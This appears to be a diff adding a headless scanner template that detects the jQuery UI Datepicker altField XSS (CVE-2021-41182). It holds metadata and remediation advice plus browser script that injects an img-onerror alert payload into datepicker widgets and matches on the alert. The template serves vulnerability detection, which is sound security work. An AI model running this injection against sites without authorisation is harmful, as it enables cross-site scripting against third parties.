@@ -1,0 +1,121 @@
+id: CVE-2021-41182
+
+info:
+  name: JQuery UI <1.13.0 - Datepicker Widget XSS 
+  author: aredspy
+  severity: medium
+  description: |
+    JQuery UI before version 1.13.0 contains a Cross-Site Scripting (XSS) vulnerability within the altField option of the Datepicker widget. The widget does not treat the field as non code input, and so an untrusted input can execute arbitrary code.  
+  impact: |
+    Accepting the value of the altField option of the Datepicker widget from untrusted sources may execute untrusted code which will run in the victim's browser and lead to potential theft of sensitive information or session hijacking.
+  remediation: |
+    Update to the latest version of Jquery UI (>=1.13.0). Alternatively, do not accept any value into the altField option from untrusted sources such as user input.
+  reference:
+    - https://blog.jqueryui.com/2021/10/jquery-ui-1-13-0-released/
+    - https://github.com/jquery/jquery-ui/security/advisories/GHSA-9gj3-hwp5-pmwc
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-41182
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
+    cvss-score: 6.5
+    cve-id: CVE-2021-41182
+    cwe-id: CWE-79
+    epss-score: 0.00279
+    epss-percentile: 0.68538
+    cpe: cpe:2.3:a:jqueryui:jquery_ui:*:*:*:*:*:jquery:*:*
+  tags: xss,jquery,cve,cve2021
+
+headless:
+  - steps:
+
+    # Might not be needed, really only here to play nice with sites that don't like empty header info
+    - action: setheader
+      args:
+        part: request
+        key: "User-Agent"
+        value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0"
+
+    - action: navigate
+      args: 
+        url: "{{BaseURL}}"
+
+    - action: waitload
+
+    - action: script
+      args:
+        hook: true
+        code: |
+          () => {
+            const windowAlert = window.alert;
+            window.alerts = [];
+
+            window.alert = function(message) {
+              console.log(`window.alert called with message: ${message}`);
+              window.alerts.push(message);
+              //return windowAlert(message);
+            };
+          }
+
+    - action: script
+      args:
+        hook: true
+        code: |
+            window.onload = function(){
+
+              let elems = document.getElementsByClassName('hasDatepicker');
+
+              console.log(elems);
+
+              const datepickers = [];
+
+              for (elem of elems) {
+                console.log(elem);
+                
+                //sanity check
+                try {
+                    var dp = window.$.datepicker._getInst(elem);
+                } catch (error) {
+                    console.log("No associated datepicker object");
+                    continue;
+                }
+
+                //check if datepicker has altField set/in use
+                if ("altField" in dp.settings) {
+                    datepickers.push(dp);
+                }
+              }
+
+              console.log(datepickers);
+
+              for (dp of datepickers) {
+
+                // XSS funni moment
+
+                title = "XSS detected on element ID: \"".concat(dp.id).concat("\", ");
+                console.log(title);
+                input = `<img onerror='alert(\`${title}\`)' src='/404' />`;
+
+                dp.settings.altField = input;
+                id = document.getElementById(dp.id);
+                $("#".concat(dp.id)).datepicker( "setDate", "10/12/2012" );
+              }
+
+            };
+
+    - action: script
+      name: alerts
+      args:
+        hook: true
+        code: |
+          () => { return window.alerts }
+
+    matchers:
+      - type: word
+        part: alerts
+        words:
+          - "XSS detected on element ID"
+    extractors:
+      - type: kval
+        part: alerts
+        kval:
+          - alerts
+
